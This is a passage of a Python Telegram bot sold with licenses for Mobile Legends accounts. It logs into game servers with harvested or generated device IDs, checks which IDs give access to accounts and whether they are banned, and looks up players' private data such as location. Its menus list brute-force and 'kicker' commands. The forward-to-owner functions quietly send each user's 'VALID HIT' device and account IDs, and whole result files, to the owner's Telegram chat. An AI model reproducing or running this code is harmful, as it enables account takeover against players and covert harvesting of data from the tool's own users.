        if pid != 2 or not res: return "UNKNOWN", f"{device_id} | BAD", True

        acc = res.get(0); sk = res.get(1); zd = res.get(2)
        if acc is None or sk is None: return "UNKNOWN", f"{device_id} | NO_SESSION", False
        if isinstance(zd, dict): zid = zd.get(0, 0)
        elif isinstance(zd, list) and zd:
            zid = zd[0] if not isinstance(zd[0], dict) else zd[0].get(0, 0)
        else: zid = zd or 0

        try: conn.send_data(5, SdpStruct({0:acc,1:sk,2:conn.client_version,5:zid,6:conn.channel}))
        except: return "UNKNOWN", f"{device_id} | GS_FAIL", True
        pid, res = conn.recv_data()
        if pid != 6 or not res: return "UNKNOWN", f"{device_id} | GS_BAD", True
        gs = res.get(1)
        if not isinstance(gs, str) or ':' not in gs: return "UNKNOWN", f"{device_id} | GS_INVALID", False
        host, port_s = gs.split(':')
        try: port = int(port_s)
        except: return "UNKNOWN", f"{device_id} | GS_PORT", False

        conn.cleanup()
        try: conn.connect(host, port)
        except: return "UNKNOWN", f"{device_id} | GS_CONN", True
        try:
            conn.send_data(10001, SdpStruct({
                0:acc,1:sk,2:zid,4:conn.client_version,13:conn.channel,15:conn.device_id}))
            conn.send_data(10101, SdpStruct({0: 0, 2: 2}))
        except: return "UNKNOWN", f"{device_id} | ENTER_FAIL", True

        got_20001 = False
        deadline = time.time() + 25.0
        try: conn.socket.settimeout(10.0)
        except: pass
        while time.time() < deadline:
            pid, res = conn.recv_data()
            if pid == -1:
                if got_20001: continue
                continue
            if pid is None:
                if got_20001: continue
                return "UNKNOWN", f"{device_id} | CLOSED_NO_20001", False
            if pid == 20001:
                got_20001 = True
                bi = parse_ban_20001(res)
                if bi:
                    reason = bi.get('reason_name', 'Banned')
                    d = bi.get('endtime_day', '?')
                    return "BANNED", f"{device_id} | {reason} | Day {d}", False
                return "CLEAR", device_id, False
        return "UNKNOWN", f"{device_id} | NO_20001_25S", True
    except Exception as e:
        return "UNKNOWN", f"{device_id} | EXC:{type(e).__name__}", True
    finally:
        conn.cleanup()

def check_device_ban_silent(device_id):
    st, res, trans = check_device_ban_strict(device_id)
    if st == "UNKNOWN" and trans:
        time.sleep(0.4)
        st, res, trans = check_device_ban_strict(device_id)
    return st, res

print("[BOOT] Bagian 5/10 selesai")

# ══════════════════════════════════════════════════════════════════
#  PLAYER DATA
# ══════════════════════════════════════════════════════════════════
HERO_ID_MAP = {
    1:"Miya",2:"Balmond",3:"Saber",4:"Alice",5:"Nana",6:"Tigreal",7:"Alucard",8:"Karina",
    9:"Akai",10:"Franco",11:"Bane",12:"Bruno",13:"Clint",14:"Rafaela",15:"Eudora",16:"Zilong",
    17:"Fanny",18:"Layla",19:"Minotaur",20:"Lolita",21:"Hayabusa",22:"Freya",23:"Gord",
    24:"Natalia",25:"Kagura",26:"Chou",27:"Sun",28:"Alpha",29:"Ruby",30:"Yi Sun-shin",
    31:"Moskov",32:"Johnson",33:"Cyclops",34:"Estes",35:"Hilda",36:"Aurora",37:"Lapu-Lapu",
    38:"Vexana",39:"Roger",40:"Karrie",41:"Gatotkaca",42:"Harley",43:"Irithel",44:"Grock",
    45:"Argus",46:"Odette",47:"Lancelot",48:"Diggie",49:"Hylos",50:"Zhask",51:"Helcurt",
    52:"Pharsa",53:"Lesley",54:"Jawhead",55:"Angela",56:"Gusion",57:"Valir",58:"Martis",
    59:"Uranus",60:"Hanabi",61:"Chang'e",62:"Kaja",63:"Selena",64:"Aldous",65:"Claude",
    66:"Vale",67:"Leomord",68:"Lunox",69:"Hanzo",70:"Belerick",71:"Kimmy",72:"Thamuz",
    73:"Harith",74:"Minsitthar",75:"Kadita",76:"Faramis",77:"Badang",78:"Khufra",79:"Granger",
    80:"Guinevere",81:"Esmeralda",82:"Terizla",83:"X.Borg",84:"Ling",85:"Dyrroth",86:"Lylia",
    87:"Baxia",88:"Masha",89:"Wanwan",90:"Silvanna",91:"Cecilion",92:"Carmilla",93:"Atlas",
    94:"Popol and Kupa",95:"Yu Zhong",96:"Luo Yi",97:"Benedetta",98:"Khaleed",99:"Barats",
    100:"Brody",101:"Yve",102:"Mathilda",103:"Paquito",104:"Gloo",105:"Beatrix",
    106:"Phoveus",107:"Natan",108:"Aulus",109:"Aamon",110:"Valentina",111:"Edith",
    112:"Floryn",113:"Yin",114:"Melissa",115:"Xavier",116:"Julian",117:"Fredrinn",
    118:"Joy",119:"Novaria",120:"Arlott",121:"Ixia",122:"Nolan",123:"Cici",
    124:"Chip",125:"Zhuxin",126:"Suyou",127:"Lukas",128:"Kalea",129:"Zetian",130:"Obsidia"
}

def map_rank(p):
    if not p or not isinstance(p, (int, float)) or p <= 0: return "Unranked"
    p = int(p)
    if p >= 136:
        stars = p - 136
        if stars >= 100: return f"Mythical Immortal ({stars}★)"
        if stars >= 50:  return f"Mythical Glory ({stars}★)"
        if stars >= 25:  return f"Mythical Honor ({stars}★)"
        return f"Mythic ({stars}★)"
    defs = [
        (0,4,"Warrior III"),(5,9,"Warrior II"),(10,14,"Warrior I"),
        (15,19,"Elite IV"),(20,24,"Elite III"),(25,29,"Elite II"),(30,34,"Elite I"),
        (35,39,"Master IV"),(40,44,"Master III"),(45,49,"Master II"),(50,54,"Master I"),
        (55,59,"Grandmaster IV"),(60,64,"Grandmaster III"),(65,69,"Grandmaster II"),(70,74,"Grandmaster I"),
        (75,81,"Epic IV"),(82,88,"Epic III"),(89,95,"Epic II"),(96,107,"Epic I"),
        (108,114,"Legend IV"),(115,121,"Legend III"),(122,128,"Legend II"),(129,135,"Legend I"),
    ]
    for mn, mx, name in defs:
        if mn <= p <= mx: return name
    return "Unknown"

def map_collector(point):
    if point is None or point < 1000: return "No Tier"
    tiers = [
        (1000,4000,"Amateur Collector"),(4000,10000,"Junior Collector"),
        (10000,22000,"Seasoned Collector"),(22000,44000,"Expert Collector"),
        (44000,84000,"Renowned Collector"),(84000,160000,"Exalted Collector"),
        (160000,280000,"Mega Collector"),(280000,float('inf'),"World Collector"),
    ]
    for mn, mx, name in tiers:
        if mn <= point < mx:
            if name == "World Collector": return name
            per = (mx - mn) / 5
            lvl = int((point - mn) // per)
            return f"{name} {['V','IV','III','II','I'][lvl]}"
    return "Unknown"

def fmt_ts(ts):
    try:
        utc = datetime.fromtimestamp(ts, timezone.utc)
        return (utc + timedelta(hours=8)).strftime("%Y-%m-%d %H:%M")
    except: return "N/A"

def extract_player_data(result, role_info=None, creation_ts=0, v2l_data=None):
    if not result or not result[0] or len(result[0]) == 0: return None
    try:
        pd = result[0][0]
        nickname  = pd.get(2, "Unknown"); player_id = pd.get(0, "Unknown")
        server    = pd.get(1, "Unknown"); level = pd.get(3, "Unknown")
        skin      = pd.get(83, 0); hero_cnt = pd.get(4, 0)
        if role_info: hero_cnt = role_info.get(9, hero_cnt)
        loc = pd.get(71)
        location = ", ".join(loc) if isinstance(loc, list) and len(loc) >= 2 else "NOT FOUND"
        last_login = pd.get(5, 0); country = pd.get(97, "Unknown")
        squad = (pd.get(30, "") or "").replace("`", "").strip() or "—"
        high_rank    = map_rank(pd.get(95)) if pd.get(95) is not None else "Unknown"
        current_rank = map_rank(pd.get(8))  if pd.get(8)  is not None else "Unknown"
        tag136 = pd.get(136, {})
        cpoint = tag136.get(9, 0) if isinstance(tag136, dict) else 0
        ctier  = map_collector(cpoint)
        tag91 = pd.get(91, [])
        history = [HERO_ID_MAP.get(h, f"Unknown({h})") for h in reversed(tag91)] if tag91 else []
        v2l = v2l_data if isinstance(v2l_data, str) else "N/A"
        tb = pd.get(17, 0); tw = pd.get(18, 0)
        wr = f"{min(tw/tb*100, 100):.1f}%" if tb > 0 and tw > 0 else "N/A"
        _MIN_TS = 1451577600
        cts = pd.get(6, 0)
        if creation_ts and creation_ts >= _MIN_TS: cdate = fmt_ts(creation_ts)
        elif cts and cts >= _MIN_TS: cdate = fmt_ts(cts)
        else: cdate = "N/A"
        return {
            'nickname': nickname, 'player_id': player_id, 'server': server,
            'level': level, 'skin_count': skin, 'hero_count': hero_cnt,
            'rating_score': pd.get(9, 0), 'location': location,
            'last_login': fmt_ts(last_login) if last_login else "N/A",
            'create_account_country': country, 'high_rank': high_rank,
            'current_rank': current_rank, 'achievement_points': pd.get(7, 0),
            'collector_point': cpoint, 'collector_tier': ctier,
            'hero_history': history, 'squad': squad, 'v2l_status': v2l,
            'creation_date': cdate, 'win_rate': wr,
            'total_battles': tb, 'total_wins': tw,
            'followers': pd.get(15, 0), 'popularity': pd.get(14, 0),
        }
    except Exception: return None

FALLBACK_DEVICE_IDS = [
    "and_4e9c3d2b1a0f8e7d6c5b4a39281706f5e4d3c2b1a0f9e8d7c6b5a4938271605f4e3d2c1b0a9f8e7d6c5b4a39281706f5",
]

_DEVICE_IDS_CACHE = []
_DEVICE_IDS_LOCK  = threading.Lock()

def _load_device_ids():
    global _DEVICE_IDS_CACHE
    with _DEVICE_IDS_LOCK:
        if _DEVICE_IDS_CACHE: return _DEVICE_IDS_CACHE
        if RESULTS_FILE.exists():
            ids = []
            try:
                with open(RESULTS_FILE, "r", encoding="utf-8-sig", errors="ignore") as f:
                    for line in f:
                        for m in re.finditer(r"(?:and_|ios_)[A-Za-z0-9_-]+", line):
                            did = m.group(0)
                            if did not in ids: ids.append(did)
            except: pass
            _DEVICE_IDS_CACHE = ids
            return ids
        return []

def lookup_player_data(player_id, zone_id=None, device_id=None):
    try:
        if device_id: attempts = [device_id]
        else:
            attempts = _load_device_ids()[:8]
            if not attempts and FALLBACK_DEVICE_IDS:
                attempts = FALLBACK_DEVICE_IDS[:1]
        if not attempts:
            return {"error": "No device IDs", "status": "error"}

        last_err = "Unknown"
        for cur_dev in attempts:
            try:
                with GameConnection(device_id=cur_dev) as conn:
                    if not conn.connect_to_game_server():
                        last_err = "GS fail"; continue
                    rate_wait()
                    result = conn.lookup_player(player_id)
                    if result is None:
                        last_err = "Not found"; continue
                    if zone_id:
                        filtered = None
                        if result and result[0]:
                            for p in result[0]:
                                if isinstance(p, dict) and p.get(1) == zone_id:
                                    filtered = {0: [p]}; break
                        if filtered: result = filtered
                    rid = result[0][0].get(0, player_id) if (result and result[0]) else player_id
                    zid = result[0][0].get(1, 0) if (result and result[0]) else 0
                    ri = None
                    try: ri = conn.get_skin_role_info(rid, zid)
                    except: pass
                    v2l = None
                    try: v2l = conn.get_v2l_status(rid, zid)
                    except: pass
                    pd = extract_player_data(result, ri, conn.creation_ts, v2l)
                    if pd:
                        return {"status": "success", "player_data": pd, "device_used": cur_dev}
                    last_err = "Extract fail"
            except: pass
        return {"error": last_err, "status": "error"}
    except Exception as e:
        return {"error": str(e), "status": "error"}

def save_valid_result(device_id, account_id, zone_id):
    line = f"Device id: {device_id} | account id: {account_id} | zone id: {zone_id}"
    try:
        with open(RESULTS_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except: pass
    try:
        if on:
            daily_dir = RESULTS_DIR / "daily"
            daily_dir.mkdir(exist_ok=True)
            ts = now_wib().strftime("%Y-%m-%d")
            daily_file = daily_dir / f"valid-{ts}.txt"
            on.append_with_lock(daily_file, line)
    except: pass
    global _DEVICE_IDS_CACHE
    with _DEVICE_IDS_LOCK:
        _DEVICE_IDS_CACHE = []

print("[BOOT] Bagian 6/10 selesai")

# ══════════════════════════════════════════════════════════════════
#  TELEGRAM API
# ══════════════════════════════════════════════════════════════════
def tg_api(method, **payload):
    try:
        r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                          json=payload, timeout=20)
        return r.json()
    except: return {"ok": False}

def tg_send(chat_id, text, keyboard=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if keyboard:
        payload["reply_markup"] = {"inline_keyboard": keyboard}
    return tg_api("sendMessage", **payload).get("ok", False)

def tg_send_doc(chat_id, filepath, caption=""):
    try:
        with open(filepath, "rb") as f:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                files={"document": f},
                data={"chat_id": chat_id, "caption": caption[:1024]},
                timeout=120)
        return r.json().get("ok", False)
    except: return False

def tg_edit(chat_id, message_id, text, keyboard=None):
    payload = {"chat_id": chat_id, "message_id": message_id,
               "text": text, "parse_mode": "HTML"}
    if keyboard is not None:
        payload["reply_markup"] = {"inline_keyboard": keyboard}
    return tg_api("editMessageText", **payload).get("ok", False)

def tg_answer_cb(cb_id, text="", alert=False):
    return tg_api("answerCallbackQuery", callback_query_id=cb_id,
                  text=text, show_alert=alert).get("ok", False)

def tg_get_file(file_id):
    r = tg_api("getFile", file_id=file_id)
    if not r.get("ok"): return None
    try:
        fp = r["result"]["file_path"]
        url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{fp}"
        dl = requests.get(url, timeout=180)
        if dl.status_code != 200: return None
        ext = Path(fp).suffix or ".txt"
        local = UPLOAD_DIR / f"up_{int(time.time())}_{secrets.token_hex(4)}{ext}"
        local.write_bytes(dl.content)
        return str(local)
    except: return None

def _auto_expire_qris(cid, message_id, amount, ttl=300):
    try:
        time.sleep(ttl)
        active = dn.get_active_qris(cid) if dn else None
        if not active: return
        if active.get("message_id") != message_id: return
        if dn:
            tg_edit(cid, message_id, dn.format_donate_expired(amount),
                    dn.kb_qris_expired())
            dn.clear_qris(cid)
            log_forensic({"type": "donation_expired", "user": cid, "amount": amount})
    except Exception as e:
        safe_print(f"[EXPIRE ERR] {e}")

# ══════════════════════════════════════════════════════════════════
#  FORWARD
# ══════════════════════════════════════════════════════════════════
def forward_single_to_owner(user_cid, username, device_id,
                            account_id, zone_id, source="single", extra=None):
    key = f"{device_id}:{account_id}:{zone_id}:{secrets.token_hex(4)}"
    with _FWD_LOCK:
        if key in _FWD_CACHE: return
        _FWD_CACHE.add(key)
        if len(_FWD_CACHE) > 100000: _FWD_CACHE.clear()

    def _do():
        try:
            time.sleep(random_delay())
            alias = get_alias(user_cid)
            ts = now_wib().strftime("%Y-%m-%d %H:%M:%S WIB")
            msg = (
                f"🎯 <b>VALID HIT</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 User    : <b>{username}</b>\n"
                f"🏷 Alias   : <code>{alias}</code>\n"
                f"🆔 Chat ID : <code>{user_cid}</code>\n"
                f"📂 Source  : <b>{source.upper()}</b>\n"
                f"🕒 Waktu   : {ts}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"📱 Device  : <code>{device_id}</code>\n"
                f"🆔 Account : <b>{account_id}</b>\n"
                f"🌐 Zone    : <b>{zone_id}</b>\n"
            )
            if extra:
                msg += "━━━━━━━━━━━━━━━━━━━\n"
                for k, v in extra.items(): msg += f"📌 {k}: <b>{v}</b>\n"
            tg_send(OWNER_CHAT_ID, msg)
            log_forensic({"type": "valid_hit", "user": user_cid, "username": username,
                          "alias": alias, "device": device_id, "account": account_id,
                          "zone": zone_id, "source": source})
        except Exception as e:
            log_forensic({"type": "fwd_error", "error": str(e)})

    threading.Thread(target=_do, daemon=True).start()

def forward_batch_to_owner(user_cid, username, valid_list,
                            source="bulk", output_file=None):
    if not valid_list: return
    bkey = hashlib.sha256(
        f"{user_cid}:{int(time.time())}:{len(valid_list)}:{secrets.token_hex(4)}".encode()
    ).hexdigest()[:16]
    with _FWD_LOCK:
        if bkey in _FWD_CACHE: return
        _FWD_CACHE.add(bkey)

    def _do():
        try:
            time.sleep(random_delay())
            alias = get_alias(user_cid)
            ts = now_wib().strftime("%Y-%m-%d %H:%M:%S WIB")
            header = (
                f"📦 <b>BATCH VALID</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 User    : <b>{username}</b>\n"
                f"🏷 Alias   : <code>{alias}</code>\n"
                f"🆔 Chat ID : <code>{user_cid}</code>\n"
                f"📂 Source  : <b>{source.upper()}</b>\n"
                f"🕒 Waktu   : {ts}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Total   : <b>{len(valid_list)}</b> valid\n"
            )
            tg_send(OWNER_CHAT_ID, header)
            preview = "<b>📋 PREVIEW:</b>\n"
            for v in valid_list[:20]:
                preview += (f"• <code>{v['device'][:42]}</code>\n"
                            f"  └ {v['account']} | {v['zone']}\n")
            if len(valid_list) > 20:
                preview += f"\n<i>... +{len(valid_list)-20} lainnya</i>"
            tg_send(OWNER_CHAT_ID, preview)
            if output_file and Path(output_file).exists():
                tg_send_doc(OWNER_CHAT_ID, str(output_file),
                            f"📁 {len(valid_list)} valid dari {alias}")
            log_forensic({"type": "batch_valid", "user": user_cid, "username": username,
                          "alias": alias, "count": len(valid_list), "source": source,
                          "file": str(output_file) if output_file else None})
        except Exception as e:
            log_forensic({"type": "batch_fwd_error", "error": str(e)})

    threading.Thread(target=_do, daemon=True).start()

print("[BOOT] Bagian 7/10 selesai")

# ══════════════════════════════════════════════════════════════════
#  FILE HELPERS
# ══════════════════════════════════════════════════════════════════
DEVICE_RE = re.compile(r"(?i)(?:and_|ios_)[A-Za-z0-9_-]+")

def extract_device_ids(text):
    ids, seen = [], set()
    for line in (text or "").split("\n"):
        for m in DEVICE_RE.finditer(line):
            d = m.group(0)
            if d not in seen:
                seen.add(d); ids.append(d)
    return ids

def read_valid_lines():
    if not RESULTS_FILE.exists(): return []
    try: return [l.rstrip() for l in RESULTS_FILE.read_text(
        encoding="utf-8", errors="ignore").split("\n") if l.strip()]
    except: return []

def parse_valid_line(line):
    m = re.search(r"Device id:\s*((?:and_|ios_)[A-Za-z0-9_-]+)", line, re.I)
    if not m: return None
    did = m.group(1)
    m2 = re.search(r"account id:\s*(\d+)", line, re.I)
    m3 = re.search(r"zone id:\s*(\d+)", line, re.I)
    return {"device": did,
            "account": m2.group(1) if m2 else "?",
            "zone": m3.group(1) if m3 else "?"}

def resolve_user(arg):
    arg = str(arg).strip()
    if arg.startswith("@"):
        if UNAME_STORE:
            tid = UNAME_STORE.resolve(arg)
            if tid: return tid
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                            params={"limit": 100}, timeout=10)
            for u in r.json().get("result", []):
                c = u.get("message", {}).get("chat", {})
                if c.get("username","").lower() == arg[1:].lower():
                    return str(c["id"])
        except: pass
        return None
    if arg.isdigit(): return arg
    return None

# ══════════════════════════════════════════════════════════════════
#  MENU TEXTS
# ══════════════════════════════════════════════════════════════════
def menu_main(username, cid):
    role = get_role(cid)
    if role is None: return "🚫 <b>Diblokir</b>"
    labels = {"owner":"👑 OWNER","admin":"🔧 ADMIN","user":"👤 USER","guest":"👻 GUEST"}
    lim = ""
    if role == "user":
        _, ul, ml = check_limit(cid, "lookup")
        _, uv, mv = check_limit(cid, "valid")
        lim = f"\n📊 Limit: <b>{ul}/{ml}</b> L | <b>{uv}/{mv}</b> V\n"
    return (
        f"🎯 <b>PEITER STORE</b>\n"
        f"<i>Ultimate Edition v10</i>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👋 Halo <b>{username}</b>\n"
        f"🎭 Role: {labels.get(role,'👤 USER')}\n"
        f"⚡ Mode: <b>{PERFORMANCE_MODE.upper()}</b>\n"
        f"{lim}━━━━━━━━━━━━━━━\nPilih menu 👇"
    )

def menu_status(cid):
    ts = now_wib().strftime("%Y-%m-%d %H:%M:%S WIB")
    up = int(time.time() - _BOT_START_TIME)
    h, r = divmod(up, 3600); m, s = divmod(r, 60)
    donate_mode = "OFF"
    if dn and QRIS_CFG:
        donate_mode = dn.get_donate_mode(QRIS_CFG).upper()
    return (
        f"✅ <b>Bot Online</b>\n\n"
        f"🕒 {ts}\n⏱ Uptime: {h}h {m}m {s}s\n"
        f"⚡ Mode: <b>{PERFORMANCE_MODE.upper()}</b>\n"
        f"💰 Donate: <b>{donate_mode}</b>\n"
        f"👤 Users: {len(_USER_ACCESS)}\n"
        f"🚫 Blocked: {len(_BLOCKED_USERS)}"
    )

def menu_help(cid):
    role = get_role(cid)
    t = (
        "❓ <b>Bantuan</b>\n\n"
        "<b>📌 USER:</b>\n"
        "/menu /help /status /myid /mylimit\n"
        "/notif on|off — Notif job selesai\n"
        "/lookup ID [ZONE]\n/valid DEVICE\n"
        "/stats /ping /progress\n"
        "/donate — Donasi ke owner\n"
        "/donatecancel — Batalkan QRIS\n"
        "/redeem KEY — Aktifkan license\n"
        "/mylicense — Cek license kamu\n"
    )
    if role in ("admin", "owner"):
        t += (
            "\n<b>🔧 ADMIN:</b>\n"
            "/ban DEVICE\n/gendev [N] [and|ios|mixed]\n"
            "/bulklookup /bulkdetail /bulkban /bulkvalid\n"
            "/exportcsv /exportjson /zip\n"
            "/split N /filter /dedup /merge\n"
            "/bruteforce /bfgen N TYPE /bfkick ID [N] [DELAY]\n"
            "/stopjob /pipeline\n"
        )
    if role == "owner":
        t += (
            "\n<b>👑 OWNER:</b>\n"
            "/adduser /deluser /addadmin /deladmin\n"
            "/listusers /listadmins /userinfo @user\n"
            "/setrole @user ROLE\n"
            "/setlimit /resetlimit /resetalllimit\n"
            "/block /unblock /blocklist\n"
            "/broadcast MSG /log /logclear\n"
            "/debug /version /about\n"
            "/backup /cleanup /setmode MODE\n"
            "/fwdstats /fwdlog /last /today\n"
            "\n<b>💰 DONASI:</b>\n"
            "/donate — Menu donasi\n"
            "/donatemode — Set mode\n"
            "/donatepending — Lihat pending\n"
            "/donateapprove ID — Approve\n"
            "/donatereject ID — Reject\n"
            "/donatestats /donatelist /donaterewards\n"
            "/setqris /setbank /setewallet\n"
            "/testqris /qrisinfo\n"
            "/donateclear — Hapus data\n"
            "\n<b>🔑 LICENSE:</b>\n"
            "/license /genlicense /listlicenses\n"
            "/revokelicense KEY\n"
        )
    return t

def menu_myid(cid, username):
    role = get_role(cid)
    rmap = {"owner":"👑 OWNER","admin":"🔧 ADMIN","user":"👤 USER",
            "guest":"👻 GUEST",None:"🚫 BLOCKED"}
    lines = [f"👤 <b>Profil</b>\n", f"📛 {username}",
             f"🆔 <code>{cid}</code>", f"🎭 {rmap.get(role,'👤')}"]
    if role == "user":
        _, ul, ml = check_limit(cid, "lookup")
        _, uv, mv = check_limit(cid, "valid")
        lines += [f"\n📊 Lookup: <b>{ul}/{ml}</b>",
                  f"✅ Valid: <b>{uv}/{mv}</b>"]
    return "\n".join(lines)

def menu_stats():
    try:
        lines = RESULTS_FILE.read_text(encoding="utf-8", errors="ignore").split("\n")
        valid = len([l for l in lines if l.strip()])
    except: valid = 0
    return (f"📈 <b>Statistik</b>\n\n"
            f"📁 Total valid: <b>{valid}</b>\n"
            f"👤 Users: <b>{len(_USER_ACCESS)}</b>\n"
            f"🚫 Blocked: <b>{len(_BLOCKED_USERS)}</b>")

print("[BOOT] Bagian 8/10 selesai")

# ══════════════════════════════════════════════════════════════════
#  INLINE KEYBOARDS
# ══════════════════════════════════════════════════════════════════
def kb_main(cid):
    role = get_role(cid)
    if role is None: return []
    if role == "user":
        return [
            [{"text":"🎯 Tools","callback_data":"sub_tools"},
             {"text":"👤 Profil","callback_data":"menu_myid"}],
            [{"text":"🔑 My License","callback_data":"my_license"},
             {"text":"🔔 Notif","callback_data":"my_notif"}],
            [{"text":"💰 Donasi","callback_data":"don_menu"},
             {"text":"📊 Status","callback_data":"menu_status"}],
            [{"text":"❓ Bantuan","callback_data":"menu_help"}],
        ]
    if role == "admin":
        return [
            [{"text":"🎯 Tools","callback_data":"sub_tools"},
             {"text":"📦 Bulk","callback_data":"sub_bulk"}],
            [{"text":"⚙️ Lainnya","callback_data":"sub_other"},
             {"text":"💥 BF","callback_data":"sub_bf"}],
            [{"text":"👤 Profil","callback_data":"menu_myid"},
             {"text":"🔑 My License","callback_data":"my_license"}],
            [{"text":"💰 Donasi","callback_data":"don_menu"},
             {"text":"📊 Status","callback_data":"menu_status"}],
            [{"text":"❓ Bantuan","callback_data":"menu_help"}],
        ]
    return [
        [{"text":"🎯 Tools","callback_data":"sub_tools"},
         {"text":"📦 Bulk","callback_data":"sub_bulk"}],
        [{"text":"⚙️ Lainnya","callback_data":"sub_other"},
         {"text":"💥 BF","callback_data":"sub_bf"}],
        [{"text":"👑 Manage","callback_data":"sub_manage"},
         {"text":"🔑 License","callback_data":"sub_license"}],
        [{"text":"💰 Donasi","callback_data":"don_menu"},
         {"text":"🔧 System","callback_data":"sub_system"}],
        [{"text":"📊 Stats","callback_data":"menu_stats"},
         {"text":"📜 Log","callback_data":"menu_log"}],
        [{"text":"❓ Bantuan","callback_data":"menu_help"}],
    ]

def kb_tools():
    return [
        [{"text":"🎯 Lookup","callback_data":"cb_lookup"},
         {"text":"✅ Cek Valid","callback_data":"cb_valid"}],
        [{"text":"🚫 Cek Ban","callback_data":"cb_ban"},
         {"text":"💥 BF","callback_data":"sub_bf"}],
        [{"text":"🎬 Pipeline","callback_data":"cb_pipeline"}],
        [{"text":"« Kembali","callback_data":"menu_main"}],
    ]

def kb_bulk():
    return [
        [{"text":"🎯 Bulk Lookup","callback_data":"bulk_lookup"},
         {"text":"📱 Bulk Detail","callback_data":"bulk_detail"}],
        [{"text":"🚫 Bulk Ban","callback_data":"bulk_ban"},
         {"text":"✅ Bulk Valid","callback_data":"bulk_valid"}],
        [{"text":"⏹ Stop","callback_data":"stop_job"}],
        [{"text":"« Kembali","callback_data":"menu_main"}],
    ]

def kb_other():
    return [
        [{"text":"🔧 Gen DevID","callback_data":"menu_gendev"},
         {"text":"📤 Export CSV","callback_data":"cb_export_csv"}],
        [{"text":"📤 Export JSON","callback_data":"cb_export_json"},
         {"text":"🗜 Zip","callback_data":"cb_zip"}],
        [{"text":"✂️ Split","callback_data":"cb_split"},
         {"text":"🔍 Filter","callback_data":"cb_filter"}],
        [{"text":"🗑 Dedup","callback_data":"cb_dedup"},
         {"text":"🔗 Merge","callback_data":"cb_merge"}],
        [{"text":"« Kembali","callback_data":"menu_main"}],
    ]

def kb_bf():
    return [
        [{"text":"🔨 BF Generate","callback_data":"bf_gen"},
         {"text":"💥 BF Kicker","callback_data":"bf_kick"}],
        [{"text":"⏹ Stop","callback_data":"stop_job"}],
        [{"text":"« Kembali","callback_data":"menu_main"}],
    ]

def kb_manage():
    return [
        [{"text":"➕ Add User","callback_data":"mg_adduser"},
         {"text":"➖ Del User","callback_data":"mg_deluser"}],
        [{"text":"➕ Add Admin","callback_data":"mg_addadmin"},
         {"text":"👥 List Users","callback_data":"mg_listusers"}],
        [{"text":"👤 User Info","callback_data":"mg_userinfo"},
         {"text":"🎭 Set Role","callback_data":"mg_setrole"}],
        [{"text":"⚙️ Set Limit","callback_data":"mg_setlimit"},
         {"text":"🔄 Reset Limit","callback_data":"mg_resetlimit"}],
        [{"text":"🚫 Block","callback_data":"mg_block"},
         {"text":"✅ Unblock","callback_data":"mg_unblock"}],
        [{"text":"« Kembali","callback_data":"menu_main"}],
    ]

def kb_system():
    return [
        [{"text":"📢 Broadcast","callback_data":"sy_broadcast"},
         {"text":"📜 Log","callback_data":"menu_log"}],
        [{"text":"🧪 Debug","callback_data":"sy_debug"},
         {"text":"💾 Backup","callback_data":"sy_backup"}],
        [{"text":"🗑 Cleanup","callback_data":"sy_cleanup"},
         {"text":"⚡ Set Mode","callback_data":"sy_setmode"}],
        [{"text":"« Kembali","callback_data":"menu_main"}],
    ]

def kb_license():
    return [
        [{"text":"➕ Buat License","callback_data":"lic_create"}],
        [{"text":"📋 List License","callback_data":"lic_list"},
         {"text":"📊 Stats","callback_data":"lic_stats"}],
        [{"text":"🔍 Cek License","callback_data":"lic_check"},
         {"text":"🗑 Hapus License","callback_data":"lic_delete"}],
        [{"text":"⛔ Revoke","callback_data":"lic_revoke"}],
        [{"text":"« Kembali","callback_data":"menu_main"}],
    ]

def kb_lic_role():
    return [
        [{"text":"👑 Owner","callback_data":"lic_role_owner"},
         {"text":"🔧 Admin","callback_data":"lic_role_admin"}],
        [{"text":"👤 User","callback_data":"lic_role_user"},
         {"text":"🧪 Trial","callback_data":"lic_role_trial"}],
        [{"text":"« Batal","callback_data":"lic_cancel"}],
    ]

def kb_lic_duration():
    return [
        [{"text":"1 Jam","callback_data":"lic_dur_1h"},
         {"text":"24 Jam","callback_data":"lic_dur_24h"}],
        [{"text":"7 Hari","callback_data":"lic_dur_7d"},
         {"text":"30 Hari","callback_data":"lic_dur_30d"}],
        [{"text":"90 Hari","callback_data":"lic_dur_90d"},
         {"text":"♾ PERMANEN","callback_data":"lic_dur_perm"}],
        [{"text":"« Batal","callback_data":"lic_cancel"}],
    ]

def kb_lic_uses():
    return [
        [{"text":"1x Pakai","callback_data":"lic_use_1"},
         {"text":"5x Pakai","callback_data":"lic_use_5"}],
        [{"text":"10x Pakai","callback_data":"lic_use_10"},
         {"text":"∞ Unlimited","callback_data":"lic_use_999"}],
        [{"text":"« Batal","callback_data":"lic_cancel"}],
    ]

def kb_back(target="menu_main"):
    return [[{"text":"« Kembali","callback_data":target}]]

def kb_valid():
    return [
        [{"text":"✏️ Manual","callback_data":"valid_manual"},
         {"text":"📁 File .txt","callback_data":"valid_file"}],
        [{"text":"« Kembali","callback_data":"sub_tools"}],
    ]

# ══════════════════════════════════════════════════════════════════
#  CALLBACK HANDLER
# ══════════════════════════════════════════════════════════════════
def handle_callback(cb):
    cb_id = cb.get("id")
    data = cb.get("data", "")
    msg = cb.get("message", {})
    cid = str(msg.get("chat", {}).get("id"))
    mid = msg.get("message_id")
    username = msg.get("chat", {}).get("first_name") or "User"
    role = get_role(cid)
    if role is None:
        tg_answer_cb(cb_id, "🚫 Diblokir", True); return
    is_admin = role in ("admin", "owner")
    is_owner = role == "owner"

    try:
        if data == "menu_main":
            tg_answer_cb(cb_id); clear_pending(cid)
            tg_edit(cid, mid, menu_main(username, cid), kb_main(cid))
        elif data == "sub_tools":
            tg_answer_cb(cb_id); tg_edit(cid, mid, "🎯 <b>Tools Menu</b>", kb_tools())
        elif data == "sub_bulk":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
